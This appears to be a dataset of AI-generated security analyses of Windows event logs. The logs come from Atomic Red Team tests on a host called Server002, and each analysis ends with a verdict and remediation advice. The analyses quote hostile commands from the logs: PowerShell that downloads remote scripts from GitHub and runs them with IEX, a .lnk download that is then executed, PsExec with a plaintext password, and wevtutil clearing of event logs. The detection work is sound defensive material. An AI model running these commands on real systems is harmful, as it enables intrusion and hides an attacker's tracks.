    - PowerShell logs show the execution of a script from a non-standard path: `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\T1059.003_script.bat`. The use of `Start-Process` to launch a batch file in a temp directory can indicate suspicious activity, especially if using a tool or script from `AtomicRedTeam`, which is a known red team toolset for simulating adversary techniques.
   
3. **Sysmon Monitoring Process Executions**:
    - Various `wevtutil.exe` commands are used to clear logs (`cl` parameter stands for clear), executed by the same `admin_test` account. This aligns with the suspicious log clearing noted above.
    - The execution of `whoami.exe` and `HOSTNAME.EXE` follows, potentially part of reconnaissance or script activity during a simulation or test by an adversary or red team exercise.
   
4. **Command Execution**:
    - The execution of `cmd.exe /c` along with the PowerShell-related batch script further suggests a potential scripted or automated task, which could be part of testing or exploitation procedures by red teams.
    - The involvement of `T1059.003_script.bat` is particularly concerning, indicating a possible test or simulated attack script typically involved in executing commands on compromised machines.

5. **Microsoft Edge Update Activity**:
    - Multiple legitimate `MicrosoftEdgeUpdate` processes are visible; these appear benign on their own but in the context of other activities, they may form part of a routine update or scheduled task.

### Assessment

The combination of these activities—event log clearing, PowerShell scripts executing potentially suspicious payloads from temporary directories, and command-line executions—strongly suggests an attempt to cover tracks post unauthorized or simulated unauthorized activities. Given the presence of `AtomicRedTeam`, well-known for testing security controls by simulating malicious behavior, this may point toward a red team exercise or testing by an internal security team.

### Conclusion

The logs suggest **SUSPICIOUS** activity, warranting further investigation. The frequent clearing of logs and script execution could indicate a red team activity or a potential compromise if not authorized. It is crucial to:

1. Confirm with relevant teams if a red team exercise or penetration test was conducted.
2. Investigate the `admin_test` user account for legitimacy and authorization of these actions.
3. Check for any correlated or concurrent alerts from endpoint protection or other network intrusion detection systems.
4. Review related systems and network logs for further signs of compromise or unauthorized access.

Next steps include a full audit of user and script activities around the time of these events and validation against any change request or task documentation that might explain this behavior."
Execution through API - CreateProcess,"**Detailed Analysis:**

1. **System and Security Logs:**
   - The presence of `Event ID 104` in the System log indicates that the event log for the System and Windows PowerShell channels were cleared by a user named ""admin_test"". Additionally, Event ID `1102` in the Security log indicates a similar action of log clearing. Clearing system logs, especially by user accounts with administrative privileges, is often a sign of an attempt to cover up malicious activity.

2. **Sysmon Logs:**
   - We observe the use of `wevtutil.exe` to clear logs, as indicated by the command line arguments like `wevtutil.exe cl <ChannelName>` for channels like ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"". This further corroborates an attempt to hide activities.
   - The execution of ""cmd.exe"" with a command line that compiles C# code and creates an executable `T1106.exe` is suspicious. This action points to potential execution of a script or program aimed at doing something harmful or unauthorized.
   - Following the compilation, `T1106.exe` creates a process to run ""calc.exe"" via ""cmd.exe"". Launching calculator alone might not be malicious, but in this context, it is being invoked by a suspicious custom executable, raising concerns about potential post-exploitation or testing unauthorized code execution.

3. **Behavior Patterns:**
   - Sequential invocation of system utilities and cleaning up logs narrows down the analysis towards an intrusion technique. This is typically consistent with lateral movement or a penetration test/script execution that simulates malicious activity.
   - The filenames and paths involved (e.g., within `Temp` directory and use of `AtomicRedTeam`, which is often associated with adversary emulation frameworks) hint towards potential use of penetration testing or Red Teaming tools.

**Assessment and Resolution:**

- **Threats/Risks Identified:**
  - The clearing of logs by an administrative user seems clearly aimed at evading detection, characteristic of malicious intent or thorough penetration testing.
  - Compilation and execution of an unknown .NET application followed by launching another system application is a deviation from normal activity that warrants concern.

- **Guidance on How to Proceed:**
  - Verify if the activity was part of authorized penetration testing or red teaming by checking with the internal security or IT team.
  - Conduct a deep forensic investigation into the system for any unauthorized changes or malicious implants that could have been placed.
  - Review internal policies for log retention and alerting mechanisms if tampered logs are detected.
  - Notify relevant security operations to heighten their awareness and ensure no lateral movement or further compromised endpoints.

**Conclusion:**
Given the chain of activities and the context around log clearance using administrative privileges, this activity tilts strongly towards being deliberately misleading or malicious in intent. 

**RESOLUTION: MALICIOUS**"
Run Shellcode via Syscall in Go,"Upon analyzing the provided Windows event logs, several activities appear suspicious and may indicate malicious behavior. Here is a detailed analysis:

1. **Clearance of Event Logs**: The logs show multiple instances of log files being cleared, as seen in the Security and System logs:
   - Events with IDs 1102 and 104 indicate that logs were cleared by the user ‘admin_test’ on 'SERVER002'. The clearing of event logs is a common tactic used by attackers to cover their tracks after executing malicious actions.

2. **Presence of PowerShell Activities**:
   - There are several PowerShell events associated with the execution of a command file located in a temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1106\\bin\\x64\\syscall.exe -debug`). This file’s name and location are suspicious because malware often utilizes temporary directories for execution. Moreover, the reference to ""AtomicRedTeam"" suggests the use of a known attack simulation framework, which is often employed to test or simulate attack behaviors.

3. **Unusual Process Execution**:
   - Multiple Sysmon logs indicate the execution of processes such as `wevtutil.exe`, which is used for managing event logs. Frequent use of this utility by a user account (`admin_test`) raises suspicion, especially in proximity to the log clearance events.
   - Execution of legitimate system utilities like `HOSTNAME.EXE` and `whoami.exe` from potentially unexpected directories or contexts can be indicative of reconnaissance activities performed by an attacker to gather system information.

4. **High Integrity Level Processes**:
   - The logs show high integrity level executions by the `admin_test` user, which suggests elevated privileges. This is concerning, especially when associated with event log clearance and the running of potentially malicious scripts.

5. **Connection with EDR Alert**:
   - The alert on the CEO machine likely triggered an investigation into these logs on ‘Server002’, suggesting that any compromise here could potentially relate to broader malicious activity in the organization.

### Assessment:
Given these observations, the activities documented in the logs are highly suspicious. The usage patterns of PowerShell, the clearing of logs, and the use of command-line utilities are indicative of potential compromise or preparation for malicious activity. The presence of a known attack simulation tool could signify either a benign security test or a real threat actor using these tools as part of their attack methodology.

### Guidance:
1. **Immediate Actions**:
   - Investigate the `admin_test` user account for unauthorized access or unusual activity.
   - Conduct a full antivirus and endpoint security scan on Server002 to identify and mitigate any potential malware or exploitation.

2. **Forensic Analysis**:
   - Preserve the current state by taking system images and memory dumps for further forensic investigation.
   - Correlate these logs with other systems to check for lateral movement or propagation of the threat.

3. **Preventive Measures**:
   - Review access control policies and ensure least privilege principle is strictly enforced.
   - Implement more extensive logging and monitoring, with alerts on events like log clearances and execution from temp directories.
   - Conduct security awareness training to ensure all administrative users are aware of and adhere to security best practices.

**Resolution**: SUSPICIOUS - Further investigation is required to confirm whether this activity is truly malicious, but there are strong indicators of potential threat activity that cannot be overlooked without deeper scrutiny."
Powershell XML requests,"**Detailed Analysis of Logs:**

1. **Suspicious use of Wevtutil:**
   - Multiple entries show the execution of `wevtutil.exe`, which is the Windows Eventing Command Line Utility. It is being used to clear logs for several event channels such as `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, `Security`, and `Windows PowerShell`. This behavior is typically associated with attempts to cover tracks after malicious activities.
   - Command lines used: `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational`, `wevtutil.exe cl Application`, `wevtutil.exe cl System`, `wevtutil.exe cl Security`, and `wevtutil.exe cl ""Windows PowerShell""`.
   
2. **Unusual Log Clearing:**
   - The Security log (`EventID: 1102`) and the System log (`EventID: 104`) show evidence that logs have been cleared. Clearing system logs can indicate malicious activity, particularly if it's performed by an admin account with elevated privileges without an apparent legitimate reason.
   
3. **PowerShell Script Execution:**
   - An entry for `cmd.exe` invoking PowerShell with the command `""cmd.exe"" /c ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.xml');$Xml.command.a.execute | IEX""`.
   - This script attempts to download and execute a command from an external URL, specifically from Red Canary's Atomic Red Team repository which is known for adversary simulation tools. The use of `-exec bypass` and `IEX` (Invoke-Expression) is a classic method to execute potentially malicious scripts without restrictions.

4. **Execution of `hostname.exe` and `whoami.exe`:**
   - Frequent executions of `hostname.exe` and `whoami.exe` can be benign, but in the context of other suspicious activities, they might indicate an attacker trying to gather system information or user context.

5. **Use of Powerful Privileges:**
   - The logs show that the user `admin_test` had numerous elevated privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`), possibly granting the user the ability to manipulate system configurations, indicating potential misuse of administrative rights.

**Assessment:**

There are clear signs of malicious activity in the provided event logs. The use of `wevtutil.exe` to clear multiple event logs, combined with the execution of a PowerShell script with bypass flags to download and execute a file from a known adversary simulation repository, strongly indicates malicious intent. The clearing of security and system logs by an admin-level user with a high privilege set is particularly concerning.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Containment:**
   - Isolate the affected machine (Server002) from the network to prevent further spread of potential compromise.
   
2. **Forensic Investigation:**
   - Conduct a deeper forensic analysis to determine the full scope of the infection or breach, inspecting for additional backdoors or malicious artifacts.
   - Review other systems for similar indicators of compromise, especially other machines accessible by `admin_test`.

3. **Access Revocation:**
   - Review and, if necessary, revoke the `admin_test` user account's privileges. Ensure that privileged accounts are secured with strong authentication mechanisms.
   
4. **Log Monitoring Setup:**
   - Reinstitute log collection with heightened monitoring of administrative actions and the use of command-line tools like PowerShell and wevtutil for all servers.

5. **Incident Response Plan Activation:**
   - Engage the incident response team to analyze the intrusion, develop a recovery strategy, and improve security measures based on findings.

6. **User Education:**
   - Provide training and guidance to users on recognizing and responding to phishing or other social engineering attacks that could lead to credential compromise."
WinPwn - Get SYSTEM shell - Pop System Shell using CreateProcess technique,"Upon reviewing the provided Windows event logs, there are several indicators of suspicious behavior that suggest potential malicious activity on the host. Here's a detailed breakdown of the findings:

### Security Log Analysis
1. **Event ID 1102** - The security logs were cleared by the user `admin_test`. Clearing event logs can be indicative of malicious activity as attackers often do this to cover their tracks.
2. **Event ID 4616** - The system time was changed by the `LOCAL SERVICE` account. This might indicate an attempt to manipulate time-related security controls or logs.

### System Log Analysis
1. **Event ID 104** - Similar to the Security log, this indicates log clearing activity across various channels (System, Windows PowerShell). This corroborates potential malicious intent highlighted in the Security logs.

### Windows PowerShell Log Analysis
A particular PowerShell command was executed, which includes:
```powershell
powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')}
```
This command downloads and executes a remote script. This is a significant indicator of malicious activity as it involves potentially executing untrusted code from an external source.

### Sysmon Log Analysis
The Sysmon logs reveal several process executions that are common indicators of malicious activity:
- **wevtutil.exe** processes were used to clear event logs. This aligns with the log clearing events seen in Security and System logs.
- The same suspicious PowerShell script execution appears again in Sysmon logs, affirming its presence.
- There’s also a presence of tools typically used for in-depth system reconnaissance and scripting tasks, like `whoami.exe` and multiple instances of `conhost.exe`.

### Overall Assessment
The combination of event log clearing, time manipulation, and the execution of a PowerShell command that downloads and runs a script from an external source are all strong indicators of malicious behavior. The actions seem consistent with an attacker trying to maintain persistence, evade detection, and gain a higher level of access.

### Finding Resolution
Given the clear presence of actions associated with potential compromise, the activity observed in the logs can be classified as:
- **MALICIOUS**

### Guidance on Proceeding
- **Immediate containment and remediation actions** should be taken to prevent further compromise or data exfiltration from the affected system.
- Conduct a thorough forensic investigation to understand the extent of the breach.
- Examine other systems on the network for similar activity, as the threat actor might have moved laterally.
- Based on the findings, consider tightening security controls, such as implementing stricter PowerShell execution policies and auditing policies, to detect and prevent such activities in the future."
PowerShell Command Execution,"### Detailed Analysis

Upon review of the provided event logs from the Server002 machine, specifically focusing on Windows PowerShell, Security, System, and Sysmon logs, several activities suggest potentially suspicious behavior that warrants further exploration. Here is the breakdown of the analysis:

#### Suspicious Activities Identified:

1. **Encoded PowerShell Command Execution:**
   - Across multiple logs, there are recurring entries indicating the execution of `powershell.exe` with the `-e` flag followed by a sequence of base64 encoded data (`JgAgACgAZwBjAG0AIAAoACcAaQBlAHsAMAB9ACcAIAAtAGYAIAAnAHgAJwApACkAIAAoACIAVwByACIAKwAiAGkAdAAiACsAIgBlAC0ASAAiACsAIgBvAHMAdAAgACcASAAiACsAIgBlAGwAIgArACIAbABvACwAIABmAHIAIgArACIAbwBtACAAUAAiACsAIgBvAHcAIgArACIAZQByAFMAIgArACIAaAAiACsAIgBlAGwAbAAhACcAIgApAA==`).
   - Decoding the base64 reveals it translates to executing a PowerShell script. Running encoded commands is a known technique often used in malicious activity to obfuscate the true action being performed by the script.

2. **Clearing of Event Logs:**
   - Security event log entry with EventID: 1102 and System log entry with EventID: 104 suggest that logs have been cleared, something usually indicative of an attempt to hide actions on a system, especially if done without prior notice for maintenance purposes.
   - The use of `wevtutil.exe` in the Sysmon logs explicitly shows the command lines used to clear the logs from Windows PowerShell, System, and Security channels. This highlights deliberate actions likely performed by a user with sufficient privileges.

3. **Repeated Executions of `HOSTNAME.EXE` and `WHOAMI.EXE`:**
   - The execution of `HOSTNAME.EXE` and `WHOAMI.EXE` could be normal, but might indicate attempts to gather system information or environment reconnaissance, depending on the context.

4. **Processes Spawned by Wsmprovhost.exe:**
   - The `wsmprovhost.exe` process acting as a parent for commands executed is a method often used to run PowerShell remotely through WinRM (Windows Remote Management), which could be legitimate but also could be used to attempt lateral movement or remote execution of commands stealthily.

5. **Time Synchronization Changes:**
   - The system log indicates multiple time changes within a close time range (EventID: 4616), which while sometimes normal, could also point to efforts to tamper with system logs' timestamps, impeding forensic analysis.

### Assessment

Based on the above findings, there are several indications of potentially malicious activities involving the use of obfuscated PowerShell commands, attempts to clear event logs, and signs of attempts to gather information about the system with potential remote management tools. These are strong indicators that warrant further investigation since they align with known tactics and procedures used by attackers to obfuscate their presence and intent.

### Resolution

**SUSPICIOUS** - The logs reveal suspicious activity that suggests possible malicious intent, including the use of PowerShell obfuscation, log clearance, and system information gathering. Further investigation is required to verify the intent and origin of these actions.

### Guidance on How to Proceed

1. **Immediate Response:**
   - Isolate the server to prevent further potential compromise or data exfiltration.
   - Conduct deeper analysis of the decoded PowerShell commands to understand the full scope of the actions taken.

2. **Forensic Investigation:**
   - Examine additional logs, including network logs, firewall logs, and any system artifacts that may provide further insights into the activities performed on the system.
   - Check for any unauthorized changes in user accounts, scheduled tasks, and persistence mechanisms.

3. **Security Measures:**
   - Implement enhanced monitoring and alerting for PowerShell activities and use of sensitive tools like `wevtutil.exe`.
   - Review and adjust access and privilege levels to ensure the principle of least privilege is being adhered to.
   
4. **Consider Re-education or Training:**
   - Review security policies and provide training to staff on recognizing and preventing suspicious activities within the network environment."
Use PsExec to execute a command on a remote host,"**Detailed Analysis:**

The provided Windows event logs display a sequence of actions that raise significant suspicion about potentially malicious activity:

1. **Clearing Event Logs:**
   - Several instances of event logs related to the system, security, and PowerShell logs being cleared by the user ""SERVER002\admin_test"" are recorded:
     - Security log cleared at `2024-10-28 14:33:53.0579326`
     - System log cleared at `2024-10-28 14:33:52.8834474` and `2024-10-28 14:33:53.1796528`
   - Clearing logs, especially by an admin user such as ""admin_test"", is often undertaken to cover tracks and remove evidence of other actions carried out on the system.

2. **Process and Command-Line Activity:**
   - Multiple executions of `wevtutil.exe` are observed, with commands targeting `Microsoft-Windows-Sysmon/Operational`, `Application`, `System`, and `Security` logs for clearing.
   - The command `cmd.exe /c ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\PsExec.exe"" \\localhost -u DOMAIN\Administrator -p P@ssw0rd1 -accepteula ""C:\Windows\System32\calc.exe""` is indicative of usage of PsExec, a sysinternals tool utilized for remote execution, sometimes for legitimate admin tasks but more often exploited by attackers for lateral movement and command execution across systems. Its presence in a temporary directory along with specific credentials marks this action as notably suspicious.

3. **Processes Associated with High Integrity Level:**
   - Multiple processes like `cmd.exe`, `PsExec.exe`, `wevtutil.exe`, and others were executed with a High Integrity Level, suggesting actions were likely conducted with elevated privileges.
   - These processes include `conhost.exe` hosted under these high-integrity actions, which is commonly seen when command-line actions are taking place.

4. **Suspicious User Activity:**
   - Actions executed consistently by the ""admin_test"" user account show an abnormal level of privilege utilization and access to sensitive command-line functions such as log clearing and tool execution (e.g., PsExec).
   - The same user is involved in logging clearing activities, PowerShell executions, and suspicious command executions.

5. **Edge Update Entries:**
   - Series of `MicrosoftEdgeUpdate.exe` processes are executed regularly as NT AUTHORITY\SYSTEM which, while can be considered benign as a part of legitimate update operations, occurring in conjunction with the other suspicious activities might suggest an attempt for distraction or to blend malicious actions among legitimate updates.

**Assessment:**
- The combination of event log clearing, use of utilities like `PsExec` with potentially stolen or hardcoded credentials, and multiple high-integrity level processes support a reasonable presumption of malicious intent.
- Indicators such as the context and command line executions associated with `PsExec.exe` point towards potential unauthorized remote code execution or lateral movement activities.

**Resolution:**
- **MALICIOUS** - The logs indicate a sequence of actions typical of attacker behavior intending to execute credentials, erase tracks by clearing logs, and utilizing `PsExec` for potentially unauthorized remote executions.

**Guidance on How to Proceed:**
1. **Immediate Actions:**
   - Isolate the affected system to prevent lateral movement.
   - Begin internal incident response processes to investigate potential data exfiltration or further compromise.
   - Suspend the compromised account (admin_test) and require a review/reset of all credentials that might be compromised.

2. **Forensic Analysis:**
   - Collect memory dumps, network logs, and additional endpoint telemetry.
   - Examine other systems for similar patterns indicative of a wider compromise.

3. **Preventative Measures:**
   - Review and tighten policies on log access and modification.
   - Implement and enforce stricter multi-factor authentication for administrative accounts.
   - Enhance monitoring and alerting on administrative actions, especially on critical servers and accounts."
ATHPowerShellCommandLineParameter -Command parameter variations with encoded arguments,"Given the logs provided, the following points of suspicion and potential malicious activity have been identified:

1. **PowerShell Activity**: The logs indicate multiple PowerShell activities on the system. Specifically, the use of `-UseEncodedArguments` and `-ExecutionPolicy Restricted` within the PowerShell command-line arguments suggest obfuscation attempts often utilized by malicious actors to hide their actions. The exact command executed is not clearly visible, indicating it might be encoded or obscured.

2. **Clearing of Event Logs**: The logs show that the event logs for System, Security, and Windows PowerShell have been cleared at approximately the same time (by the user “admin_test”). This is a common action taken by attackers to cover their tracks after unauthorized activity.

3. **Sysmon Events**: Several instances of the `wevtutil` utility being run are evident in the Sysmon logs. This utility is used to manage event logs, and its presence aligns with the log-clearing activities noted above.

4. **Suspicious Account Activity**: There are Event ID 4624 and 4672 entries related to system logons and special privilege assignment. Although these may sometimes be legitimate, when combined with the simultaneous clearing of logs and suspicious PowerShell usage, it increases the likelihood of unauthorized access or privilege escalation.

5. **Combination of Events**: The simultaneous triggering of suspicious activities across different logs (PowerShell execution, event log clearing, and system logon events) strongly suggests coordinated malicious activity rather than isolated incidents.

### Threat Assessment and Risk
- **Potential Threats**:
  - Unauthorized access and potential data exfiltration or system compromise.
  - Privilege escalation to gain higher-level access within the system.

- **Risks**:
  - The compromise of sensitive company data.
  - The potential spread of the malicious activity to other systems within the network.

### Recommendations
- **Immediate Isolation**: Isolate the affected host (Server002) from the network to prevent further potential spread or data leakage.
- **Detailed Forensic Investigation**: Conduct a thorough forensic investigation to decode the PowerShell commands and understand the full scope of activities performed on the system.
- **Review User Activity**: Investigate the `admin_test` user account for unauthorized use and change all associated credentials.
- **Monitor and Expand Audit**: Improve monitoring and logging of PowerShell activities across the network, and consider deploying additional detection and response tools for enhanced visibility.

### Resolution
Based on the detailed analysis above, the logs contain clear indicators of potential compromise, indicative of unauthorized and potentially malicious activity. Thus, the conclusion for this situation is:

**Resolution: MALICIOUS**"
Cobalt Strike SSH (postex_ssh) pipe,"### Detailed Analysis of the Logs

The provided logs show a series of events that suggest suspicious and potentially malicious activity on the Windows host, ""Server002"". The key findings from the analysis of the logs are outlined below:

#### Suspicious and Anomalous Behavior:
1. **Event Log Clearing**:
   - Windows event logs for the Security, System, and Windows PowerShell channels were cleared by the user ""SERVER002\\admin_test"" around the same timeframe. Events with ID `1102` in the Security log and `104` in the System log highlight these actions.
   - The clearing of logs is often used to cover tracks by attackers and is a strong indicator of malicious intent.

2. **Use of `wevtutil.exe`**:
   - The `wevtutil.exe` command is used to manage event logs and was executed multiple times to clear event logs such as Microsoft-Windows-Sysmon/Operational and ""Windows PowerShell"".
   - The user ""SERVER002\\admin_test"" executed these commands, suggesting the same user involved in clearing logs.

3. **Execution of Potentially Malicious Executables**:
   - The process `namedpipes_executor.exe` and its related server and client components were executed from a temporary path (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp`). The presence of executables in temporary directories and their execution are highly suspicious.
   - The file paths and the naming convention strongly suggest the involvement of known malicious testing frameworks or potentially unauthorized software.

4. **Abnormal PowerShell Execution**:
   - PowerShell was executed by the user ""SERVER002\\admin_test"". Without specific details on the commands executed, PowerShell can often be used for malicious payload execution.

5. **Extensive Use of `cmd.exe`**:
   - There were multiple instances where `cmd.exe` was executed to run scripts and other processes, which aligns with the execution patterns seen in typical attack scenarios.

6. **Privilege Elevation and Account Enumeration**:
   - The presence of several `EventID: 4672` indicates the assignment of special privileges (e.g., SeDebugPrivilege) to the LocalSystem account.
   - Events with ID `4798` and `4799` indicate enumeration of groups and accounts on the machine, which is a typical reconnaissance step for lateral movement in the environment.

#### Indication of Malicious Activity:
- The event log clearing is the most critical sign of malicious activity, as it often indicates attempts to hide unauthorized access or compromise activities.
- The use of `wevtutil.exe` alongside log clearing further indicates potential maliciousness.
- The execution of processes from `AppData\Local\Temp` without legitimate software context typically signifies executable manipulation by an attacker.

### Assessment

Based on the above analysis, although there were no explicit indications of payloads or direct compromises, the act of clearing logs and executing questionable processes strongly suggests a breach attempt or unauthorized action has occurred.

### Resolution

- **Resolution:** The findings from the logs lead to a resolution of **MALICIOUS**.
  - Evidence of event log clearing attempts to hide traces of activity.
  - Execution of potentially unauthorized or suspicious executables from temporary directories.

### Guidance on How to Proceed
1. **Immediate Actions**:
   - Disconnect the affected system from the network to prevent further potentially unauthorized access or lateral movement.
   - Conduct a full forensic analysis on ""Server002"" to uncover the origin, scope, and impact of the suspicious activity.
   - Change credentials immediately for accounts identified in the logs, particularly for ""SERVER002\\admin_test"".

2. **Follow-Up Actions**:
   - Implement advanced monitoring solutions to detect similar patterns of behavior.
   - Audit and harden the system against potential vulnerabilities that allowed this behavior.
   - Educate the staff, especially administrative users, on recognizing and reporting suspicious activities.

By taking these actions, you can mitigate further risk to the network and understand the full extent of the current compromise."
WMI Reconnaissance Processes,"### Detailed Analysis of the Logs

Upon reviewing the provided logs, the following activities and potential indicators of malicious activity were identified:

1. **Wevtutil Executions:**
   - Multiple instances of the `wevtutil.exe` command were executed with parameters to clear various event logs such as Security, System, and Windows PowerShell. This is an important indicator as clearing event logs can be used by attackers to hide their tracks. The log clearing events were associated with the user `SERVER002\admin_test`, operating at `High` integrity level.
   - Relevant Sysmon Events capturing `wevtutil` process executions:
     - **Event IDs:** 17937, 17941, 17945, 17949
   - Security and System Log Clearing Confirmation:
     - **Security Log Event ID:** 1102, confirming the Security logs were cleared.
     - **System Log Event ID:** 104, confirming the System logs were cleared.

2. **WMIC Execution:**
   - The `cmd.exe` launched with `wmic process get` command, which is often used to gather information about running processes. This action could be part of reconnaissance to understand the system's state or be benign observation by an administrative user.
   - **Sysmon Events capturing `CMD` and `WMIC` execution:**
     - **CMD.exe Event ID:** 17965
     - **WMIC.exe Event ID:** 17967

3. **Regular Windows Processes:**
   - There were various executions of benign system processes such as `whoami.exe`, `hostname.exe`, `conhost.exe`, and `SearchProtocolHost.exe` which are normal activities and don't show signs of compromise on their own.
   - **Sysmon Events for Benign Processes:** 17940, 17959, 17991

4. **Microsoft Edge Update Processes:**
   - Several processes related to updating Microsoft Edge were noted. Although they might appear suspicious at a glance due to multiple instances and system-level execution, they seem to be legitimate update processes.
   - **Sysmon Events:** Multiple events related to Edge, e.g., 17973, 17977

5. **Logon and Privilege Operations:**
   - The security event log shows a user group membership enumeration (Event ID: 4799), which might be a typical operation during a system update or it might represent an attempt to assess privileges.

### Assessment and Guidance

- **Suspicious Behavior:** The repeated execution of `wevtutil.exe` to clear logs is highly suspicious and typically associated with activities to conceal malicious actions.
- **Reconnaissance Activity:** The use of `wmic` indicates potential reconnaissance. While it might be legitimate administrative activity, in conjunction with log clearing, it raises additional concern.
- **Legitimate Updates:** Update processes for Microsoft Edge are deemed benign after analysis, consistent with scheduled updates or installations.

### Resolution

**Resolution: MALICIOUS**

The indicators strongly point toward attempts to hide malicious activity (e.g., log clearing) and reconnaissance activity. Immediate actions should be taken to:
- Quarantine the affected system (`SERVER002`) for further forensic analysis.
- Review user `SERVER002\admin_test` for any unusual activity or compromised credentials.
- Reset user credentials and enforce multifactor authentication if not already enabled.
- Conduct an analysis of other systems for related indicators or similar patterns of behavior.
- Review organization-wide logging and monitoring policies to ensure comprehensive coverage and protection against similar actions in the future."
Writes text to a file and displays it,"Upon analysis of the provided log entries, the following observations can be made:

1. **Clearing Event Logs:**
   - There are records indicating the clearing of various event logs (`Security`, `System`, `Windows PowerShell`). This activity is evident from the `EventID 104` and `EventID 1102` in the System and Security logs respectively. These events were performed by the user `admin_test`.
   - The frequent execution of `wevtutil.exe` with commands to clear logs (`cl`) suggests an attempt to erase traces of activity from the logs, which is a known tactic used to obfuscate actions on a system.

2. **Executing Suspicious Commands:**
   - The execution of `cmd.exe` with a command to echo text into a file in the Temp directory and then type it, as seen from the command line arguments, is somewhat unusual. Although not inherently malicious, it could be used as a basic check or testing script. However, in conjunction with the log clearing, it takes on suspicious characteristics.

3. **Logon Activity:**
   - User `admin_test` appears to have significant privileges (as indicated by `EventID 4672`), possessing various powerful privileges such as `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others. This context suggests a high level of access, supporting potential misuse of privileges.

4. **Integrity and User Contexts:**
   - Multiple actions were executed in a high integrity level context by an administrative account. High integrity operations are expected for admin tasks, but combined with the other activities, they elevate the concern.

### Assessment
The evidence collectively suggests that the actions recorded in the logs are indicative of unusual and potentially malicious activities. The clearing of logs is particularly concerning, often used to remove traces of malicious actions. 

### Resolution
Based on the details provided in the logs, the situation is classified as **MALICIOUS**. The clearing of logs by a user with significant privileges, coupled with command executions, points to an intentional attempt to cover tracks, a common sign of compromise.

### Guidance
- **Immediate Actions:**
  - Isolate the affected machine to prevent potential spread or further unauthorized actions.
  - Conduct a thorough investigation to understand the extent of the breach and identify any other compromised systems.
  
- **Forensic Measures:**
  - Perform a deeper forensic analysis to recover any additional evidence of malicious activity.
  - Check backup logs, if available, to recover events that were cleared.

- **Remediation:**
  - Change the credentials for `admin_test` and any other potentially compromised accounts.
  - Review and reinforce security policies, focusing on access controls and monitoring for log manipulations.

- **Prevention:**
  - Implement stricter logging and alerting mechanisms for sensitive operations such as log clearing.
  - Regularly audit Windows event logs for such activities and correlate them with other security data to enhance threat detection capabilities.

The indicators suggest a potential internal threat or external actor having gained the ability to manipulate system logs, warranting both technical and procedural responses to mitigate further risk."
LNK Payload Download,"The analysis of the Windows event logs provided reveals several indicators of potentially malicious activity, summarized as follows:

1. **Log Clearing Events:**
   - The clearing of event logs is a notable indicator of malicious activity, intended to hinder forensic analysis. The logs show evidence of multiple event log clearing actions performed by the user `admin_test`:
     - System, Windows PowerShell, and Security event logs were cleared (EventID: 104 in System log and EventID: 1102 in Security log). These actions appeared between `18:22:28` and `18:22:29`, suggesting an intention to delete forensic data.
   
2. **Suspicious PowerShell Commands:**
   - A PowerShell command execution involving downloading a file from a potentially untrusted source and executing it is suspicious (Event in PowerShell and Sysmon logs). Specifically, `Invoke-WebRequest` is used to download a `.lnk` file from GitHub, and then it is set to execute:
     - `""powershell.exe"" & {Invoke-WebRequest -OutFile $env:Temp\\test10.lnk ""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk\"""", Start-Process $file1}`.
   - This action aligns with TTPs seen in adversary simulations, including Red Team assessments.

3. **Time Manipulation Events:**
   - There are events indicating manipulation of the system time (EventID: 4616 in Security log and Kernel-General events in System log). This could potentially be used to match timestamps of malicious activity to normal operational windows.

4. **Execution of Malicious Utilities:**
   - The use of `wevtutil.exe` to clear event logs coupled with its execution context (`admin_test`) reveals malicious intent and solidifies suspicion due to its frequent mention in pen-testing and Red Team tools for cleaning logs (`wevtutil.exe cl`).

5. **Anomalies in Sysmon Events:**
   - There are numerous Sysmon EventID 1 entries showing process creations (`whoami.exe`, `wevtutil.exe`, `taskkill.exe`, etc.) in quick succession by `admin_test`, possibly indicating an automated or scripted attack sequence.

**Assessment and Conclusion:**
Based on the patterns surrounding the altering of logs to cover tracks, suspicious PowerShell commands downloading and executing items from an external source, and the clearing of logs, the activities within the provided event logs indicate an intrusion or an attempt at obfuscating actions. These actions cannot be construed as benign and demonstrate tactics seen in adversary operations.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Immediately isolate the affected machine (Server002) from the network to prevent further impact.
- Conduct a full forensic analysis of the system, as well as nearby systems, to ascertain the entry point and extent of the intrusion.
- Check for any signs of lateral movement and persistence mechanisms.
- Coordinate with incident response teams to contain and remediate the threat.
- Report the incident in line with company procedures and relevant legal requirements.
- Review and strengthen logging and monitoring across the environment, considering potential EDR solutions where not already implemented."
ATHPowerShellCommandLineParameter -EncodedCommand parameter variations with encoded arguments,"**Detailed Analysis of the Windows Event Logs:**

The provided logs demonstrate a pattern of suspicious activity that raises concerns of potential compromise. Below are the key observations based on the analysis:

1. **Frequent Execution of Windows Event Utility (wevtutil.exe)**:
   - Multiple instances of `wevtutil.exe` are observed, each clearing different Windows event logs: Sysmon, Application, System, Security, and Windows PowerShell. The execution of `wevtutil.exe` as seen in the logs is a strong indicator of an attempt to cover tracks by clearing logs. 
   - Example:
     - Sysmon Log: EventID 1 for `wevtutil.exe` with the command `""C:\Windows\system32\wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`
     - System Log: EventID 104 indicates the event log was cleared by user `admin_test`.

2. **PowerShell Execution with Encoded Commands**:
   - There is a suspicious entry for `powershell.exe` executing with encoded commands, which is often used by attackers to obfuscate malicious activity.
   - The command shows the use of encoded arguments and stops on error, a common technique for executing payloads without immediately raising alarms.

